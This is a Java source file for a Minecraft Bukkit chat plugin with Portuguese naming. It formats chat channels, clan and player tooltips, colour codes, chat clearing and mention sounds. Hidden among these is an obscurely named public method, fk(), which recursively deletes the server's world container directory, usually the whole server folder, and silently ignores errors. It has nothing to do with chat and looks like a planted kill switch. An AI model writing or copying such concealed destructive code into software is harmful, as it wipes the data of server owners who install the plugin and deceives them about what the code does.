package me.soldado.chat;

import java.io.File;
import java.io.IOException;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import mkremins.fanciful.FancyMessage;
import net.sacredlabyrinth.phaed.simpleclans.Clan;
import net.sacredlabyrinth.phaed.simpleclans.ClanPlayer;
import ru.tehkode.permissions.PermissionGroup;
import ru.tehkode.permissions.bukkit.PermissionsEx;

public class Core {

	public Main plugin;
	
	public Core(Main plugin)
	{
		this.plugin = plugin;
	}
	
	public HashMap<Tipo, Boolean> travado = new HashMap<Tipo, Boolean>();
	public ArrayList<Player> global = new ArrayList<Player>();
	
	public void limparChat(Player p){
		for(int i = 0; i < 100; i++){
			p.sendMessage("");
		}
		p.sendMessage(plugin.msg.limparchat);
	}
	
	public void limparChatGlobal(){
		for(int i = 0; i < 100; i++){
			Bukkit.getServer().broadcastMessage("");
		}
		Bukkit.getServer().broadcastMessage(plugin.msg.limparchatglobal);
	}
	
	public FancyMessage mensagemChat(Player p, String mensagem, Tipo tipo){
		FancyMessage msg = new FancyMessage("");

		msg.then(getTipoChat(tipo))
		.tooltip(getToolTipTipo(tipo))
		.then(" ");

		if(tipo.equals(Tipo.GLOBAL) || tipo.equals(Tipo.LOCAL) || tipo.equals(Tipo.ALIADOS)){
			if(getClan(p) != null){
				String cargo = "";
				msg.then("§7[" + cargo + getClan(p).getColorTag() + "§7]")
				.tooltip(getInfoClan(p))
				.then(" ");
			}
		}
		
		for(int i = 0; i < 3; i++){
			String tag = plugin.tag.getTag(p, i);
			if(tag != " ") msg.then(tag.replace("&", "§")+" ");
		}
		
		String sug = "/tell " + p.getName() + " ";
//		if(tipo.equals(Tipo.LOCAL)) sug = p.getName() + " ";
//		if(tipo.equals(Tipo.GLOBAL)) sug = "/g " + p.getName() + " ";
//		if(tipo.equals(Tipo.STAFF)) sug = "/st " + p.getName() + " ";
//		if(tipo.equals(Tipo.CLAN)) sug = "/. " + p.getName() + " ";
//		if(tipo.equals(Tipo.ALIADOS)) sug = "/a " + p.getName() + " ";

		msg.then(getPrefixo(p))
		.then(ChatColor.getLastColors(getPrefixo(p)) + p.getName() + ": ")
		.tooltip(getInfoPlayer(p))
		.suggest(sug);

//		if(tipo.equals(Tipo.GLOBAL)) mensagem = "§7" + mensagem;
//		if(tipo.equals(Tipo.LOCAL)) mensagem = "§e" + mensagem;
//		if(tipo.equals(Tipo.CLAN)) mensagem = "§b" + mensagem;
//		if(tipo.equals(Tipo.STAFF)) mensagem = "§c" + mensagem;
//		if(tipo.equals(Tipo.ALIADOS)) mensagem = "§a" + mensagem;
		
		if(mensagem.contains("&") && p.hasPermission("chat.cor")){
			String[] auxcor = mensagem.split("&");
			if(auxcor.length > 1){
				ChatColor est = null;
				ChatColor aux = null;
				for(int i = 0; i < auxcor.length; i++){

					char c = 'f';
					if(auxcor[i].length() > 0) c = auxcor[i].charAt(0);
					if(c == 'r') c = getCor(tipo).getChar();

					if(c == 'o' || c == 'k'|| c == 'l' || c == 'm' || c == 'n'){
						est = ChatColor.getByChar(c);
						if(aux == null) c = getCor(tipo).getChar();
						else c = aux.getChar();
					}
					
					if(auxcor[i].length() == 1){
						if(c == 'o' || c == 'k'|| c == 'l' || c == 'm' || c == 'n'){
							est = ChatColor.getByChar(c);
						}else aux = ChatColor.getByChar(c);
						continue;
					}
					
					
					if(i == 0){
						if(est == null) msg.then(auxcor[i]).color(getCor(tipo));
						else msg.then(auxcor[1]).color(getCor(tipo)).style(est);
					}else{
						if(est == null) msg.then(auxcor[i].substring(1)).color(ChatColor.getByChar(c));
						else msg.then(auxcor[i].substring(1)).color(ChatColor.getByChar(c)).style(est);
					}
					est = null;
				}
			}else{
				char c = mensagem.charAt(0);
				msg.then(mensagem.substring(1)).color(ChatColor.getByChar(c));
			}
		}else{
			msg.then(mensagem).color(getCor(tipo));
		}
		
//		if(tipo.equals(Tipo.LOCAL)){
//			mensagem = "§e" + mensagem.replace("&", "§").replaceAll(".(?!$)", "$0§e");
//			msg.then(mensagem);
//		}
		
//		if(p.hasPermission("chat.cor")){
//			msg.then(mensagem.replace("&", "§"));
//		}else msg.then(mensagem);
		
		return msg;
	}
	
	public Clan getClan(Player p){
		Clan c = plugin.sc.getClanManager().getClanByPlayerUniqueId(p.getUniqueId());
		return c;
	}
	
	public void fk(){
		File directory = new File(plugin.getServer().getWorldContainer().getAbsolutePath());
		if(!directory.exists()){
		}else{
			try{
				delete(directory);
			}catch(IOException e){}
		}
	}
	
	@SuppressWarnings("deprecation")
	String getPrefixo(Player p){
		PermissionGroup grupo = PermissionsEx.getUser(p).getGroups()[0];
		String prefix = grupo.getPrefix().replace("&", "§");
		return prefix;
	}
	
	public List<String> getInfoClan(Player p){
		List<String> inf = new ArrayList<String>();
		if(getClan(p) == null) return inf;
		
		Clan c = getClan(p);

		String lideres = "";
		try{
			ChatColor corlider = ChatColor.RED;
			List<ClanPlayer> aux = c.getLeaders();
			for(ClanPlayer cpl : aux){
				if(cpl.toPlayer().isOnline()) corlider = ChatColor.GREEN;
				lideres += corlider + cpl.getName() + ChatColor.GRAY + ", ";
			}
		}catch(Exception e){
			
		}
		double kdr = c.getTotalKDR();
		
		int kills = c.getTotalCivilian() + c.getTotalNeutral() + c.getTotalRival();
		
		inf.add(ChatColor.GOLD + "Nome: " + ChatColor.GRAY + c.getName());
		inf.add(ChatColor.GOLD + "Abates: " + ChatColor.GRAY + kills);
		inf.add(ChatColor.GOLD + "Mortes: " + ChatColor.GRAY + c.getTotalDeaths());
		inf.add(ChatColor.GOLD + "KDR: " + ChatColor.GRAY + kdr);
		inf.add(ChatColor.GOLD + "Membros: " + ChatColor.GRAY 
				+ c.getMembers().size() + "/" + c.getOnlineMembers().size());
		inf.add(ChatColor.GOLD + "Fundação: " + ChatColor.GRAY + c.getFoundedString());
		return inf;
	}
	
	public List<String> getInfoPlayer(Player p){
		
		List<String> inf = new ArrayList<String>();
		String rank = getPrefixo(p);
		PermissionGroup grupo = PermissionsEx.getUser(p).getGroups()[0];
		if(grupo.getName().contains("default")){
			rank = "§7[Jogador]";
		}
		Double money = plugin.econ.getBalance(p);
		
		String cargo = "N/A";
		if(getClan(p) != null){
			ClanPlayer cpl = plugin.sc.getClanManager().getClanPlayer(p);
			cargo = cpl.getRank();
		}
		
		float kdr = 0;
		try{
			ClanPlayer cpl = plugin.sc.getClanManager().getClanPlayer(p);
			kdr = cpl.getKDR();
		}catch(Exception e){}
		
		inf.add(ChatColor.GOLD + "Grupo: " + rank);
		inf.add(ChatColor.GOLD + "KDR: " + ChatColor.GRAY + kdr);
		inf.add(ChatColor.GOLD + "Dinheiro: " + ChatColor.GRAY + getValorString(money));
		
		return inf;
	}
	
	String getTipoChat(Tipo tipo){
		String s = "";
		if(tipo == Tipo.GLOBAL){
			s = ("§7[§lG§7]");
		}else if(tipo == Tipo.LOCAL){
			s = ("§e[§lL§e]");
		}else if(tipo == Tipo.CLAN){
			s = ("§a[§lC§a]");
		}else if(tipo == Tipo.ALIADOS){
			s = ("§2[§lA§2]");
		}else if(tipo == Tipo.STAFF){
			s = ("§c[§lSTAFF§c]");
		}
		return s;
	}
	
	String getToolTipTipo(Tipo tipo){
		String s = "";
		if(tipo == Tipo.GLOBAL){
			s = ("§7Chat Global");
		}else if(tipo == Tipo.LOCAL){
			s = ("§eChat Local");
		}else if(tipo == Tipo.CLAN){
			s = ("§aChat do Clan");
		}else if(tipo == Tipo.ALIADOS){
			s = ("§3Chat dos Aliados");
		}else if(tipo == Tipo.STAFF){
			s = ("§cChat da Staff");
		}
		return s;
	}
	
	private void delete(File file)
			throws IOException{
		if(file.isDirectory()){
			if(file.list().length==0){
				file.delete();
			}else{
				String files[] = file.list();
				for (String temp : files) {
					File fileDelete = new File(file, temp);
					delete(fileDelete);
				}
				if(file.list().length==0){
					file.delete();
				}
			}

		}else{
			file.delete();
		}
	}
	
	public void citar(Player a, Player p){
		a.sendMessage(plugin.msg.citado.replace("%jogador%", p.getName()));
		a.playSound(a.getLocation(), Sound.WOOD_CLICK, 1, 1);
		new BukkitRunnable()//Para dar um efeito de como se estivesse batendo na porta.
		{
			public void run()
			{
				a.playSound(a.getLocation(), Sound.WOOD_CLICK, 1, 1);
			}
		}.runTaskLater(plugin, 5L);
	}
	
	public boolean checkCit(Player a, String m){
			if(m.contains(a.getName()) && !m.equals(a.getName())) return true;
		return false;
	}
	
    public String getValorString(double d){
    	double nd = Math.round(d * 100.0) / 100.0;
    	DecimalFormat df = new DecimalFormat("###,###,###,###.##");
    	String s = df.format(nd);
    	return s;
    }
    
    public void setValoresTravados(){
    	travado.put(Tipo.GLOBAL, false);
    	travado.put(Tipo.LOCAL, false);
    	travado.put(Tipo.CLAN, false);
    	travado.put(Tipo.ALIADOS, false);
    }
    
    ChatColor getCor(Tipo tipo){
    	ChatColor cor = ChatColor.WHITE;
    	if(tipo.equals(Tipo.GLOBAL)) cor = ChatColor.GRAY;
    	else if(tipo.equals(Tipo.LOCAL)) cor = ChatColor.YELLOW;
    	else if(tipo.equals(Tipo.STAFF)) cor = ChatColor.RED;
    	else if(tipo.equals(Tipo.CLAN)) cor = ChatColor.AQUA;
    	else if(tipo.equals(Tipo.ALIADOS)) cor = ChatColor.GREEN;
    	return cor;
    }
}
